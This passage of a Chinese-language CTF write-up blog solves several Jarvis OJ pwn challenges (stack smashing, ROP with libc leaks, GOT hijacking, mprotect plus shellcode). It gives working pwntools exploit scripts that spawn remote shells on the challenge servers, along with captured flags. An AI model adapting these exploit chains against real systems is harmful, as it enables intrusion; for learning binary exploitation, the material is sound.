class="comment">#.rodata:0000000000400934                 db 'What',27h,'s your name? ',0</span></span><br><span class="line"><span class="comment">#.rodata:000000000040094E ; char s[]</span></span><br><span class="line"><span class="comment">#.rodata:000000000040094E s               db 'Thank you, bye!',0  ; DATA XREF: func_1:loc_400878o</span></span><br><span class="line"><span class="comment">#.rodata:000000000040095E                 align 20h</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960 aNiceToMeetYouS db 'Nice to meet you, %s.',0Ah</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960                                         ; DATA XREF: func_1+3Fo</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400960                 db 'Please overwrite the flag: ',0</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400992                 align 8</span></span><br><span class="line"><span class="comment">#.rodata:0000000000400992 _rodata         ends</span></span><br></pre></td></tr></table></figure>
<p>输出结果令我们满意</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x56 bytes:</span><br><span class="line">    <span class="string">'Thank you, bye!\n'</span></span><br><span class="line">    <span class="string">'*** stack smashing detected ***: Hello!\n'</span></span><br><span class="line">    <span class="string">"What's your name?  terminated\n"</span></span><br></pre></td></tr></table></figure>
<p>但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br></pre></td></tr></table></figure></p>
<p>所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。</p>
<p>这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_b17d7868f95d135b35908e74805b7282.png" alt=""></p>
<p>可见，其实在0x400d20处存在flag的备份。</p>
<p>因此，最终的poc为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">cn = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment">#cn = process('pwn_smashes')</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(p64(<span class="number">0x0400d20</span>)*<span class="number">200</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline()</span><br><span class="line">cn.recv()</span><br></pre></td></tr></table></figure>
<p>flag:<code>PCTF{57dErr_Smasher_good_work!}</code></p>
<hr>
<p><center>===4月2日更新===</center></p>
<hr>
<h2 id="PWN-XMAN-level3-x64"><a href="#PWN-XMAN-level3-x64" class="headerlink" title="PWN - [XMAN]level3(x64)"></a>PWN - [XMAN]level3(x64)</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9883</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8e639c3daf929853a1bc654d79c7992c" target="_blank" rel="noopener">level3_x64.rar.8e639c3daf929853a1bc654d79c7992c</a></p>
</blockquote>
<p>总体和level3是一样的，只是换成了64位。</p>
<p>思路和之前一样，因为开了nx，所以直接溢出执行rop代码。</p>
<p>思路大致如下：</p>
<p>先用ROPgadget得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p_rdi_ret = 0x00000000004006b3</span><br><span class="line">p_rsi_r15_ret = 0x00000000004006b1</span><br></pre></td></tr></table></figure></p>
<p>再提一遍，64位函数的参数传递顺序和32位不同，而是从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9，第七个参数开始才放在栈上。</p>
<p>然后先leak出wirte的真实地址，然后根据偏移算出system的真实地址，通过read把system函数的地址换到比如<code>__libc_start_main</code>的got表上，然后用read把<code>/bin/bin\x00</code>写到bss段上，然后调用假的<code>plt.__libc_start_main</code>，即调用了system，从而得shell</p>
<p>poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9883</span>)</span><br><span class="line"><span class="comment">#cn = process('level3_x64')</span></span><br><span class="line">bin = ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">p_rdi_ret = <span class="number">0x00000000004006b3</span></span><br><span class="line">p_rsi_r15_ret = <span class="number">0x00000000004006b1</span></span><br><span class="line">p_bss = bin.bss()</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'bbbbbbbb'</span></span><br><span class="line"></span><br><span class="line">pay += p64(p_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">pay += p64(p_rsi_r15_ret) + p64(bin.got[<span class="string">'write'</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(bin.symbols[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">pay += p64(p_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(p_rsi_r15_ret) + p64(bin.got[<span class="string">'__libc_start_main'</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(bin.symbols[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">pay += p64(p_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(p_rsi_r15_ret) + p64(p_bss) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(bin.symbols[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">pay += p64(p_rdi_ret) + p64(p_bss)</span><br><span class="line">pay += p64(bin.plt[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"></span><br><span class="line">cn.sendline(pay)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line">p_write = u64(cn.recv(<span class="number">8</span>))</span><br><span class="line">cn.recv()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'p_write:'</span>+hex(p_write)</span><br><span class="line">p_system = p_write - libc.symbols[<span class="string">'write'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'p_system:'</span>+hex(p_system)</span><br><span class="line">cn.sendline(p64(p_system))</span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag : <code>CTF{b1aeaa97fdcc4122533290b73765e4fd}</code></p>
<hr>
<h2 id="PWN-XMAN-level4"><a href="#PWN-XMAN-level4" class="headerlink" title="PWN - [XMAN]level4"></a>PWN - [XMAN]level4</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9880</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="noopener">level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
</blockquote>
<p>这题的程序很小，函数很简单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-88h]@1</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开了nx保护，read的溢出，rop是显然的。但这道题没有给libc，但我们可以无穷leak，用pwntools的dynelf就可以搞定。</p>
<p>大致思路就是用dynelf函数leak system的真实地址，然后写<code>/bin/sh\x00</code>到bss，然后调用system拿shell。</p>
<p>poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9880</span>)</span><br><span class="line"><span class="comment">#cn = process('./level4')</span></span><br><span class="line">bin = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">p3ret = <span class="number">0x08048509</span></span><br><span class="line">bss = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    pay = <span class="string">'a'</span>*<span class="number">0x88</span> +<span class="string">'bbbb'</span></span><br><span class="line">    pay += p32(bin.symbols[<span class="string">'write'</span>]) + p32(p3ret) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    pay += p32(bin.symbols[<span class="string">'main'</span>])</span><br><span class="line">    cn.sendline(pay)</span><br><span class="line">    data = cn.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*]leaking: "</span> + data</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">p_system = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!]find p_system: '</span> + hex(p_system)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x88</span> +<span class="string">'bbbb'</span></span><br><span class="line">pay += p32(bin.symbols[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">100</span>)</span><br><span class="line">pay += p32(p_system) + <span class="string">'bbbb'</span> + p32(bss)</span><br><span class="line"></span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag : <code>CTF{882130cf51d65fb705440b218e94e98e}</code></p>
<hr>
<p><center>===4月24日更新===</center></p>
<hr>
<h2 id="PWN-XMAN-level5"><a href="#PWN-XMAN-level5" class="headerlink" title="PWN - [XMAN]level5"></a>PWN - [XMAN]level5</h2><p>题目描述：</p>
<blockquote>
<p>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p>
</blockquote>
<blockquote>
<p>nc pwn2.jarvisoj.com 9884</p>
</blockquote>
<blockquote>
<p>附件同level3_x64</p>
</blockquote>
<p>呃，怎么说呢，这题我没用mmap，只用mprotect是可以做的。</p>
<p>首先checksec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
<p>题目的意思是不让用system和execve，但是又开了NX，所以应该是要用mprotect改data段到可执行，然后执行shellcode拿shell。</p>
<p>程序反汇编代码我就不贴了，就是一些puts，write和read，由read造成栈溢出。</p>
<p>好，入正题。</p>
<p>1.想要使用mprotect，且给了libc，那首选是用write函数leak出某个函数（比如read）的地址，然后由libc计算偏移得到mprotect。</p>
<p>2.把shellcode写到bss段用read可以直接搞定不多说。</p>
<p>3.由于是64位的程序，函数的前6个参数都是通过寄存器来传递的，而rwx的十进制表示是7（b111），且mprotect的函数定义是<code>int mprotect(void *addr, size_t len, int prot);</code>。我们的7是作为第三个参数放在rdx里，而一般是不存在有关rdx的gadgets的，所以这里我们考虑使用<code>__libc_csu_init</code>尾部的万能gadgets（能解决三个参数内的函数调用）。</p>
<p>4.大致流程：栈溢出 -&gt; leak read -&gt; hijack got -&gt; write shellcode to bss -&gt; call mprotect to set ‘rwx’ -&gt; exec shellcode</p>
<p>具体的实现细节我就不说了，直接看下面的poc用gdb调着看会好很多，而且poc我也都注释了。</p>
<p>写贴出poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">bin = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ssize_t vulnerable_function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  char buf; // [sp+0h] [bp-80h]@1</span></span><br><span class="line"><span class="string">  write(1, "Input:\n", 7uLL);</span></span><br><span class="line"><span class="string">  return read(0, &amp;buf, 0x200uLL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p64(n)</span><br><span class="line"></span><br><span class="line">rr = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rr:</span><br><span class="line">    cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9884</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = process(<span class="string">'./level5'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p_rsi_r15_ret = <span class="number">0x00000000004006b1</span></span><br><span class="line">p_rdi_ret = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">cn.recv()<span class="comment">#'Input:\n'</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'bbbbbbbb'</span></span><br><span class="line">pay += p(p_rsi_r15_ret) + p(bin.got[<span class="string">'read'</span>]) + p(<span class="number">0</span>)</span><br><span class="line">pay += p(p_rdi_ret) + p(<span class="number">1</span>)</span><br><span class="line">pay += p(bin.plt[<span class="string">'write'</span>])<span class="comment">#leak got read</span></span><br><span class="line">pay += p(p_rsi_r15_ret) + p(bin.got[<span class="string">'__libc_start_main'</span>]) + p(<span class="number">0</span>)</span><br><span class="line">pay += p(p_rdi_ret) + p(<span class="number">0</span>)</span><br><span class="line">pay += p(bin.plt[<span class="string">'read'</span>])<span class="comment">#hijack __libc_start_main -&gt; mprotect</span></span><br><span class="line">pay += p(p_rsi_r15_ret) + p(bin.bss()) + p(<span class="number">0</span>)</span><br><span class="line">pay += p(bin.plt[<span class="string">'read'</span>])<span class="comment">#write shellcode to bss</span></span><br><span class="line">pay += p(p_rsi_r15_ret) + p(bin.got[<span class="string">'__gmon_start__'</span>]) + p(<span class="number">0</span>)</span><br><span class="line">pay += p(bin.plt[<span class="string">'read'</span>])<span class="comment">#hijack __gmon_start__ -&gt; bss_shellcode</span></span><br><span class="line">pay += p(bin.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line">p_read = u64(cn.recv()[:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> hex(p_read)</span><br><span class="line">p_mprotect = p_read - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'mprotect'</span>] <span class="comment">#calc the addr of mprotect</span></span><br><span class="line"></span><br><span class="line">cn.send(p(p_mprotect))</span><br><span class="line">sh = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="keyword">print</span> len(sh)</span><br><span class="line"></span><br><span class="line">cn.send(sh)</span><br><span class="line"></span><br><span class="line">cn.send(p(bin.bss()))</span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">cn.recv()<span class="comment">#'Input:\n'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j</span></span><br><span class="line"><span class="string">.text:0000000000400690                 mov     rdx, r13</span></span><br><span class="line"><span class="string">.text:0000000000400693                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400696                 mov     edi, r15d</span></span><br><span class="line"><span class="string">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040069D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:00000000004006A1                 cmp     rbx, rbp</span></span><br><span class="line"><span class="string">.text:00000000004006A4                 jnz     short loc_400690</span></span><br><span class="line"><span class="string">.text:00000000004006A6</span></span><br><span class="line"><span class="string">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j</span></span><br><span class="line"><span class="string">.text:00000000004006A6                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:00000000004006AA                 pop     rbx</span></span><br><span class="line"><span class="string">.text:00000000004006AB                 pop     rbp</span></span><br><span class="line"><span class="string">.text:00000000004006AC                 pop     r12</span></span><br><span class="line"><span class="string">.text:00000000004006AE                 pop     r13</span></span><br><span class="line"><span class="string">.text:00000000004006B0                 pop     r14</span></span><br><span class="line"><span class="string">.text:00000000004006B2                 pop     r15</span></span><br><span class="line"><span class="string">.text:00000000004006B4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># using __libc_csu_init to set registers and make call</span></span><br><span class="line">pay = pay = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'bbbbbbbb'</span><span class="comment">#buffer padding</span></span><br><span class="line">pay += p(<span class="number">0x00000000004006A6</span>) <span class="comment">#loc_4006A6</span></span><br><span class="line">pay += <span class="string">'bbbbbbbb'</span><span class="comment">#padding</span></span><br><span class="line">pay += p(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">pay += p(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">pay += p(bin.got[<span class="string">'__libc_start_main'</span>])<span class="comment">#r12-&gt;addr &gt;&gt; call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be execute</span></span><br><span class="line">pay += p(<span class="number">7</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">pay += p(<span class="number">0x1000</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">pay += p(<span class="number">0x00600000</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">pay += p(<span class="number">0x0000000000400690</span>)<span class="comment">#loc_400690</span></span><br><span class="line"><span class="comment">#call second function</span></span><br><span class="line">pay += <span class="string">'bbbbbbbb'</span><span class="comment">#padding</span></span><br><span class="line">pay += p(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">pay += p(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">pay += p(bin.got[<span class="string">'__gmon_start__'</span>])<span class="comment">#r12-&gt;addr &gt;&gt; call p_shellcode</span></span><br><span class="line">pay += p(<span class="number">0</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">pay += p(<span class="number">0</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">pay += p(<span class="number">0</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">pay += p(<span class="number">0x0000000000400690</span>)<span class="comment">#loc_400690</span></span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line">cn.interactive()</span><br><span class="line"><span class="comment">#CTF&#123;9c3a234bd804292b153e7a1c25da648c&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里再稍微提一下<code>__libc_csu_init</code>尾部这个万能gadgets使用的注意点，他调用任意函数的语句是<code>call    qword ptr [r12+rbx*8]</code>，所以我们通过下面的<code>pop r12</code>设置，而为了使程序的流程正常，我们必须保证<code>rbx+1 = rbp</code>（上面有add rbx,1 ; cmp rbx,rbp ; jnz     short loc_400690），所以我们一般设置r12为我们指向需要的地址的指针的地址（有点绕），rbx为0，rbp为1（比如got表上的值就是我们上面r12要的东西，举个栗子，用这句代码调用read，那就让r12 = bin.got[‘read’]）不懂也可以再看看上面的poc我是怎么调用的。</p>
<p>flag : <code>CTF{9c3a234bd804292b153e7a1c25da648c}</code></p>
<hr>
<p><center>===4月25日更新===</center></p>
<hr>
<h2 id="PWN-Test-Your-Memory"><a href="#PWN-Test-Your-Memory" class="headerlink" title="PWN - Test Your Memory"></a>PWN - Test Your Memory</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9876</p>
</blockquote>
<blockquote>
<p>题目来源：CFF2016</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/memory.838286edf4b832fd482d58ff1c217561" target="_blank" rel="noopener">memory.838286edf4b832fd482d58ff1c217561</a></p>
</blockquote>
<p>简单的栈溢出，真搞不懂为什么有300分。</p>
<p>先上poc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = process('./memory')</span></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9876</span>)</span><br><span class="line">bin = ELF(<span class="string">'./memory'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">p_cat_flag = <span class="number">0x080487E0</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x13</span> + <span class="string">'bbbb'</span></span><br><span class="line">pay += p32(bin.symbols[<span class="string">'win_func'</span>]) + p32(p_cat_flag) + p32(p_cat_flag)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.recv()</span><br><span class="line"><span class="keyword">print</span> cn.recv()</span><br></pre></td></tr></table></figure>
<p>关键函数及代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // eax@1</span><br><span class="line">  _BYTE rand_str_10[11]; // [sp+1Dh] [bp-13h]@2</span><br><span class="line">  signed int v6; // [sp+28h] [bp-8h]@1</span><br><span class="line">  signed int i; // [sp+2Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  v6 = 10;</span><br><span class="line">  puts(&quot;\n\n\n------Test Your Memory!-------\n&quot;);</span><br><span class="line">  v3 = time(0);</span><br><span class="line">  srand(v3);</span><br><span class="line">  for ( i = 0; i &lt; v6; ++i )                    // 循环10次</span><br><span class="line">    rand_str_10[i] = alphanum[rand() % 